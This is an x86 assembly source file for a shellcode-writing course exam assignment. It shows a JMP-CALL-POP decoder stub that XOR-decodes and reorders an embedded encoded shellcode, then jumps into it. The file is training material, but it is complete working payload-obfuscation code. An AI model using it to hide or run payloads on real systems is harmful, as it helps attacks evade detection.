# SLAE Exam Assignment #4: Shellcode Decoder
# Author: Rikih Gunawan

global _start:

section .text
_start:
    jmp short call_shellcode ; JMP-CALL-POP Method

decoder:
    pop esi                 ; get address of EncodedShellcode
    xor ecx, ecx            ; ecx = 0
    mul ecx                 ; eax = 0
    cdq                     ; edx = 0; xor edx, edx
    mov cl, slen            ; cl = length of encoded shellcode
    mov edi, 0xcefaafde     ; xor key: deafface

decode:
    mov al, byte [esi]      ; al= 1st byte
    mov ah, byte [esi + 1]  ; ah= 2nd byte
    mov bl, byte [esi + 2]  ; bl= 3rd byte
    mov bh, byte [esi + 3]  ; bh= 4th byte
    xor al, 0x7             ; xor 1st byte
    xor ah, 0x7             ; xor 2nd byte
    xor bl, 0x7             ; xor 3rd byte
    xor bh, 0x7             ; xor 4th byte
    mov byte [esi], bh      ; replace the 1st byte with decoded shellcode byte
    mov byte [esi + 1], bl  ; replace the 2nd byte with decoded shellcode byte
    mov byte [esi + 2], ah  ; replace the 3rd byte with decoded shellcode byte
    mov byte [esi + 3], al  ; replace the 4th byte with decoded shellcode byte

    xor dword [esi], edi    ; xor dword with xor key

    add esi, 0x4            ; mov to next 4 byte
    sub ecx, 0x4            ; ecx = length of shellcode - decrease counter by 4
    jnz short decode        ; loop if ecx not zero
    
    jmp short EncodedShellcode ; jmp to esi - decoded shellcode 

call_shellcode:
    call decoder            ; jmp to decoder label and save the address of EncodedShellcode
    EncodedShellcode: db 0xa1,0xad,0x68,0xe8,0xa1,0x8e,0x87,0xf6,0xa0,0x9f,0x87,0xb1,0x99,0x1e,0x21,0xb7,0x40,0xae,0x4a,0x50,0x4,0xf6,0x18,0x38,0x59,0x6d,0x38,0x59
    slen equ $-EncodedShellcode ; length of the encoded shellcode